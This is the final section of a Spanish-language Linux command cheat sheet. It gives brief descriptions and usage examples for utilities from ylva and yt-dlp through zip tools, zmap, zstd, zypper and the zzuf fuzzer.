Gestión de datos en un archivo encriptado con permisos chmod 600.
$ ylva -i file.db (Crea una nueva base de datos)
$ ylva -a (una entrada de datos. Pide: "Title" [único dato obligatorio los demás son opcionales], "Username", "Url", "Notes" y "Password"
$ ylva -A (listar entradas si todavia no está encriptada)
$ ylva -E (encriptar la base de datos. Pide contraseña)
$ ylva -D file.db (desencriptar la base de datos. Pide la contraseña entrada para encriptarla)
$ ylva -e 2 (editar la entrada con ID 2. Los campos que permanecen igual pulsar "intro" y modificar el que corresponda)
$ ylva -l 2 (lista toda la entrada con ID 2)
$ ylva -r 2 (eliminar la entra con ID 2)
$ ylva -p (mostrar nombre de la base de datos)


yokadi
Herramienta para organizar tareas tipo agenda. Crea una base de datos sqlite en el directorio personal [~/.yokade.db].
$ yokadi (Entra en el prompt. La primera vez que se ejecuta crea la base de datos)
Una vez en el promt, algunos comandos son:
yokadi> t_add leer El péndulo de Foucault de Umberto Eco (entrar una tarea)
yokadi> t_list (ver las tareas)
yokadi> t_mark_done 1 (borrar la tarea con el id 1)
yokadi> t_due 3 +2d (marcar la tarea 3 para dentro de 2 dias)
yokadi> t_due 3 23/04 13:00 (marcar la tarea 3 para el dia 23 de abril a la 1 del mediodia)
yokadi> t_list --all (cuanto falta hasta las fechas señaladas)
yokadi> t_list leer --all (listado de todos los libros que hemos entrado para leer)
yokadi> t_show 5 (abre el editor por defecto del sistema para modificar el texto de la tarea 5)
yokadi> t_add -c esto es muy secreto (entrar algo que no se quiere que se vea. Pide contraseña)
yokadi> c_set PASSPHRASE_CACHE 0 (a continuación esconder la contraseña entrada)
yokadi> t_list (si no se entra la contraseña no mostrará los datos)


you-get
[python3, ffmpeg]. Descarga de videos y, en algunos casos audio o imágenes de sitios web populares (youtube, tumblr, vimeo...) consulta de sitios soportados en <https://you-get.org/#supported-sites> . Descarga:
# pip3 install you-get
O de github <https://github.com/soimort/you-get/archive/master.zip>
$ you-get URL (descarga normal de video, audio o imagenes)
$ you-get -i URL (informacion sobre la url)
$ you-get --itag=243 URL (de la información anterior, descargar la itag 243)
$ you-get Wagner (buscar sobre el termino especificado y empieza la descarga)
$ you-get -p vlc URL (Transmitir el video por un reproductor especificado)
$ you-get -p firefox URL (transmitirlo por el navegador)
$ you-get -o /Vídeos -O titulo URL (descargar el video en un directorio y con un titulo concreto)


youtube-dl
Utilidad basada en Python que permite descargar videos de sitios populares como YouTube, Dailymotion, Photobucket, Facebook, Yahoo, Metacafe y más. Admite varios formatos de medios, incluidos MP4, WebM, etc. Esta aplicación está siendo substituida por yt-dlp [ver]
$ youtube-dl url (forma básica)
$ youtube-dl -U (actualizar la aplicación)
$ youtube-dl -o nombre.flv url  (Guardar con nombre especificado)
$ youtube-dl -a archivo_de_urls_de_youtube (bajar multiples videos)
$ youtube -upepe -pcontraseña url (especificando usuario y contraseña)
$ youtube-dl -t --extract-audio --audio-format mp3 url (Sacar el audio en formato mp3 a un video de youtube)
$ youtube-dl --write-sub --sub-lang en url (Bajar el video y los subtítulos en inglés con extensión .en.vtt si están disponibles)
	Nota.- En algunas ocasiones muestra un error (ERROR: format not available for video) se soluciona bajando directamente el ejecutable de internet y suprimiendo el de los repositorios.


y-ppa-manager
utilidad para gestionar los PPA en Launchpad.
# y-ppa-cmd (Lanza las formas de usar el comando)
# y-ppa-manager (abre la interfaz gráfica)


yt-dlp
[FFmpeg]. Utilidad escrita en python [pip install yt-dlp] para descargar audio y video de servicios como YouTube. Es un fork de youtube-dl que actualmente parece que no se está desarrollando.
$ yt-dlp url (forma básica)
$ yt-dlp -F url (muestra diferentes formatos de descarga)
$ yt-dlp -f 137 url (especificando formato según listado anterior)


ytfzf
Script para buscar, descargar y reproducir vídeos de YouTube haciendo uso de mpv y youtube-dl. Para cada consulta de búsqueda de YouTube, se muestra una lista de resultados con el título del video, el canal que lo publicó, la cantidad de vistas, la duración, la fecha de carga y la miniatura del video.
$ ytfzf


ytree
Navegador de archivos minimalista. Puede usarse para administrar permisos en directorios, ver distintos tipos de archivos [gif, jpg, txt, html] con los visores favoritos de cada uno y revisar archivos comprimidos [tar, arc, lha, zip, zoo]. Permite configuraciones regionales UTF-8
$ ytree


yum
Gestor de programario de distros basadas Redhat
# yum install paquete  (instala paquete)
# yum -y install paquete1 paquete2 (instala los paquetes mencionados)
# yum -y install paquete.arch (instala paquete con la arquitectura mencionada: firefox.i386)
# yum -y update   (actualiza todos los paquetes del sistema)
# yum -y update --exclude=mysql (actualiza todos menos mysql)
# yum -y update gftp  (actualiza solo el paquete mencionado)
# yum check-update   (Muestra la lista de paquetes que se han de actualizar)
# yum info paquete    (Muestra información de paquete)
# yum info available   (Muestra información de los paquetes actualizables)
# yum list     (lista los paquetes disponibles)
# yum list installed  (lista los paquetes instalados en el sistema)
# yum list available (lista los paquetes disponibles)
# yum list updates   (lista los paquetes actualizables)
# yum remove paquete (suprime paquete)
# yum -y remove paquete1 paquete2  (suprime los paquetes mencionados)
# yum search paquete  (busca paquete en la base de datos)
# yum clean packages  (limpia la caché)
# yum repolist   (Lista los repositorios)


zcat
Ver contenido de archivos comprimidos con gzip.


zcmp
Compara dos archivos comprimidos (Ver cmp)


zdiff
Muestra diferencias entre dos archivos o directorios comprimidos (Ver diff)
$ zdiff archivo1 archivo2


zdump
Visualiza la zona horaria especificada.
$ zdump Madrid


zegrep
Busca expresiones regulares sobre archivos comprimidos (Ver egrep)


zellij
Es un espacio de trabajo para la terminal que permite dividirla en diferentes paneles y pestañas e incluye un motor de diseño que permite a los usuarios definir un mapa de paneles en un archivo yaml y cargarlo cuando se inicia la aplicación. También dispone de plugins como extensiones. Descarda de https://github.com/zellij-org/zellij


zenity
Creación de dialogos gráficos simples. Especialmente para scripts.
$ zenity -?   (muestra las opciones de la aplicación y de ayuda)
$ zenity --title Archivo --width 800 --height 600 --text-info --filename /home/usuario/archivo.txt (mostrar un archivo)
$ zenity --info --text="Este PC va a explotar en 10 segundos. Date por muerto."
$ zenity --password --username (Muestra diálogo entrar usuario y contraseña)
$ zenity --calendar (Muestra el calendario)
$ zenity --scale (Muestra la escala)


zerofree
Suprimir bloques libres de los sistemas de archivos ext2, ext3 y ext4, por defecto con ceros. El sistema sobre el que se actue ha de estar desmontado.
# zerofree /dev/sda1
# zerofree -n /dev/sda3 (Realizar un simulacro sin modificar el sistema de archivos)


zfgrep
Busca cadenas de texto fijas sobre archivos comprimidos (ver fgrep)


zforce
Fuerza una extensión .gz en todos los archivos gzip para que gzip no los comprima dos veces. En los sistemas con una limitación de 14 caracteres en los nombres de archivo, el nombre original se trunca para dejar espacio para el sufijo .gz. Por ejemplo, 12345678901234 se renombra a 12345678901.gz. Un nombre de archivo como foo.tgz se deja intacto.
$ zforce archivo archivo


zgrep
imprime las líneas que cumplan la expresión regula sobre ficheros comprimidos (Ver grep)


zile
Pequeño, rápido y potente clon de Emacs útil para instalaciones en dispositivos de poca capacidad (disquettes) o para sesiones de edición rápida. La mayoría de las secuencias de teclas y nombres de función son iguales que las de Emacs.
$ zile


zip
[unzip]. comprime y empaqueta
$ zip archivo.zip fichero1 fichero2 (Comprimir varios ficheros)
$ zip -r archivo.zip file1 file2 dir1 (comprimir varios files y directorios)


zipcmp
Compara dos archivos zip y comprueba si contienen los mismos archivos,
$ zipcmp -p file1.zip file2.zip (comparando archivos y metadatos)


zipinfo
muestra información técnica sobre archivos ZIP. Dicha información incluye permisos de acceso a archivos, estado de cifrado, tipo de compresión, versión y sistema operativo o sistema de archivos del programa de compresión y similares.
$ zipinfo -h archivo.zip (Se imprime el nombre del archivo, el tamaño real en bytes)y el número total de archivos)
$ zipinfo -t archivo.zip (lista totales para todos los archivos, cantidad de archivos enumerados, tamaños totales sin comprimir y comprimidos y factor de compresión general)
$ zipinfo -l archivo.zip (lista la información del archivo zip en formato largo)


zipmerge
Fusiona un archivo zip de origen con un archivo zip de destino. De forma predeterminada, los archivos que forman parte del zip de origen sobrescriben los archivos existentes con el mismo nombre en el archivo zip de destino.
$ zipmerge -l -i origen.zip destino.zip (ignorar diferencias mayúsculas/minúsculas y preguntar antes de sobreescribir)


ziptime
Reemplaza las marcas de tiempo en los encabezados Zip con una hora estática (1 de enero de 2008). Los campos adicionales no se modifican.
$ ziptime archivo.zip


ziptool
Utilidad para manipular archivos zip modificando detalles como marcas de tiempo u otros metadatos.
$ ziptool archivo.zip add texto.txt \"Linux es un sistema genial\" (incluir en archivo.zip un texto.txt con el contenido especificado)
$ ziptool archivo.zip delete 8 (eliminar el archivo 8 del .zip especificado)
$ ziptool -c archivo.zip (verificar la coherencia del .zip al abrirlo por terminal)


zless
Pagina la visualización de un fichero comprimido (Ver less).


zmap
Herramienta que permite escanear las direcciones IP de todo Internet en menos de 1 hora. Para incrementar la velocidad, el escaneo no se realiza por orden de número de IPs sinó a saltos. Desgarga:
$ git clone https://github.com/zmap/zmap.git


zmore
Pagina la visualización de un fichero comprimido (Ver more)


znew
Permite recomprimir los ficheros comprimidos con extensión .z a .gz.
$ znew archivo.z (creará un archivo.gz. Si existe en el directorio pedirá confirmación  para sobreescribir)
$ znew -vf archivo.z (lo mismo pero sobreescribir sin confirmar)


zonemaster-cli
Utilidad para la validación DNS.
$ zonemaster-cli IP (forma básica)
$ zonemaster-cli --list_tests (listado)
$ zonemaster-cli --test basic00 IP (test sobre una opción del listado anterior de una ip)


zoo
Compresor/descompresor de archivos.
$ zoo -a archivo.zoo ficheros (Comprimir)
$ zoo -x archivo.zoo (Descomprimir)
$ zoo -v archivo.zoo (Ver contenido)


zopfli
Compresor de archivos. El paquete incluye la aplicación zopflipng.
$ zopfli --zlib archivo (crea archivo.zlib. Si no se especifica salida [zlib] lo hace en formato gzip)
$ zopfli --deflate archivo (crea archivo.deflate)
$ zopflipng entrada.png salida.png (optimizar un archivo y escribir salida si es más pequeño)


zoxide
Herramienta que permite moverse entre directorios como el clásico cd. Se trata de una herramienta que aprende de tus movimientos y ayuda a desplazarse con el mínimo número de saltos. Es una herramienta que está inspirada en z y autojump, pero que está disponible para las shell mas utilizadas, como Bash, Zsh o Fish. Esta aplicación se puede lanzar de varias formas: z, za y zi son otra forma de utilizar zoxide de forma intereactiva. De esta forma se combina la potencia de zoxide con la potencia de fzf.
En bash colocar en ~/.bashrc la linea y recargar:
  eval "$(zoxide init bash)"
  $ source ~/.bashrc
$ za .emacs.d/elpa (entrar un nuevo directorio a la base de datos)
$ z elpa (ir al directorio especificado con za)
$ z (ir al directorio /home/usuario)
$ zi (ver directorios de la base de datos)


zrun
Hace que los archivos comprimidos que son argumentos de un comando se descompriman automáticamente. Soporta los tipos de compresión gz, bz2, Z, xz, lzma y lzo.
$ zrun grep linux archivo.gz (buscar la palabra "linux" en el comrpimido "archivo.gz")


zssh
Programa para transferir archivos a/de una máquina remota utilizando shell seguro ssh. Pretende ser una alternativa a scp [ver].


zstd
Comprimir y descomprimir archivos. Incorpora 3 ejecutables: zstdmt [equivale a zstd -T0], unzstd [equivale a zstd -d] y zstdcat [que equivale a zstd -dcf]
$ zstd -z file1 file2 file3 (crear los comprimidos file1.zst, file2.zst y file3.zst)
$ zstd -d *.zst (los descomprime sin borrar los comprimidos)
$ zstd -T0 -z archivo -o nombre.zst (comprimir un archivo con otro nombre e intente detectar y utilizar la cantidad de núcleos de CPU físicos [T0])
$ zstd -dct archivo (descomprimir, agregar verificación de integridad calculada a partir de datos sin comprimir y probar la integridad de los archivos comprimidos)


zswap
Módulo del kernel con la función principal de evitar la paginación en disco incrementando el rendimiento del sistema. Para activar este módulo se precisa una partición Swap y que la versión de kernel sea como mínimo la 3.11.
# nano /etc/default/grub
Y añadir la opción "zswap.enabled" en la linea:
GRUB_CMDLINE_LINUX_DEFAULT="quiet zswap.enabled=1"
Actualizar grup:
# update-grub
Una vez reiniciado comprobar su funcionamiento con:
$ dmesg | grep zswap


zsync
Descargar partes nuevas de un archivo del que ya se tiene una copia anterior en el pc.
$ zsync http://cdimage.ubuntu.com/daily-live/current/raring-desktop-amd64.iso.zsync


zulucrypt-cli
Herramienta para crear y administrar volúmenes cifrados con luks, Plain, truecrypt y veracrypt.
$ zuluCrypt-cli -c -d /dev/sda1 -z ext4 -t luks -p contraseña (crear un volumen encriptado de la partición especificada, tipo ext4, tipo de volumen y contraseña existente)
$ zuluCrypt-cli -o -d /dev/sda1 -m sda1 -e ro -p contraseña (abrir volumen, componente que se agregará al prefijo del punto de montaje, solo lectura y contraseña existente)
$ zuluCrypt-cli -q -d /dev/sda1 (cerrar volumen)
$ zuluCrypt-cli -r -d /dev/sda1 -p contraseña (suprimir contraseña de un volument)
$ zuluCrypt-cli -a -d /dev/sda1 -y contraseña -l nueva (añadir contraseña a la existente en un volumen luks)


zutils
Conjunto de herramientas capaces de procesar cualquier combinación de ficheros comprimidos y sin comprimir. Los ficheros comprimidos se descomprimen sobre la marcha; no se crean ficheros temporales. Actualmente, los compresores compatibles son gzip, bzip2, lzip, xz y zstd. Incluye las aplicaciones zcat [Descomprime y copia ficheros], zcmp [Descomprime y compara dos ficheros byte a byte], zdiff [Descomprime y compara dos ficheros línea a línea], zgrep [Descomprime y busca en ficheros una expresión regular], ztest [Comprueba la integridad de ficheros comprimidos] y zupdate [Recomprime ficheros al formato lzip].


zutty
Emulador de terminal con baja latencia similar a varios otros emuladores como xterm, rxvt...
$ zutty -title linux -cr #e10e0e -bg #605353 -fg #f36d6d -geometry 120x40 bash (con titulo, cursor de un color, fondo y fuentes de otros con una geometria concreta y usando bash)


zypper
Gestor de paquetes de opensuse [rpm]
# zypper (Generar una lista de paquetes instalados)
# zypper repos (Listar repositorios)
# zypper install paquete  (Instalar paquete)
# zypper install rutadelpaquete (Instalar paquetes que no está en los repositorios)
# zypper install --force paquete (Reinstalar)
# zypper remove paquete (Desinstalar paquete)
# zypper remove --clean-deps paquete (Desinstalar con dependencias)
# zypper search paquete (Buscar paquete)
# zypper help comando (ayuda para un comando)
# zypper update (Actualizar base de datos y el sistema)
# zypper info paquete (Buscar información de paquete)
# zypper clean (Limpiar caché e información obsoleta)
# zypper refresh (Actualizar información)
# zypper dist-upgrade (Actualizar distro)
# zypper al 'paquete' (Descartar paquete para actualizaciones)
# zypper rl 'paquete' (Desbloquear paquete del bloqueo anterior)
# zypper verify (Verificar dependencias)
# zypper intall-new-recommends (Instalar paquetes recomendados)
# zypper list-updates (Listar Actualizaciones disponibles)
# zypper list-patches (Listar parches disponibles)
# zypper patches (Instalar parches disponibles)
# zypper addrepo rutadelrepositorio (Añadir repositorio)
# zypper addrepo -f repositorio rutadelrepositorio (Añadir con actualización automática)
# zypper modifyrepo --disable repositorio (Desactivar repositorio)
# zypper removerepo nombredelrepositorio (Suprimir repositorio)


zzuf
Altera de forma aleatoria el contenido de un archivo.
$ zzuf -b10- -r0.6 cat datos.txt (a partir del 10 byte y modificando el 60% del contenido del archivo datos.txt)
